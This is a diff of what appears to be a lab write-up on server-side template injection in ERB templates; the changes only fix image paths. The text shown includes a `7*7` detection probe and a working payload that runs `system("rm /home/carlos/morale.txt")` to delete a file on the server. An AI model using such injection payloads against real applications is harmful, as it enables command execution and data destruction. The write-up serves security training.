@@ -29,11 +29,11 @@ Test Payload: `<%= 7*7 %>`
 
 The payload must return 49 as an expected result
 
-![](Pasted%20image%2020260624060705.png)
+![](images/Pasted%20image%2020260624060705.png)
 
 Page Reaction
 
-![](Pasted%20image%2020260624060738.png)
+![](images/Pasted%20image%2020260624060738.png)
 
 It executes! so it is vulnerable
 
@@ -44,9 +44,9 @@ Proceeding to the main objective which is to delete the `morale.txt` file from C
 
 Payload: `<%= system("rm /home/carlos/morale.txt") %>`
 
-![](Pasted%20image%2020260624060807.png)
+![](images/Pasted%20image%2020260624060807.png)
 
-![](Pasted%20image%2020260624060820.png)
+![](images/Pasted%20image%2020260624060820.png)
 
 
 
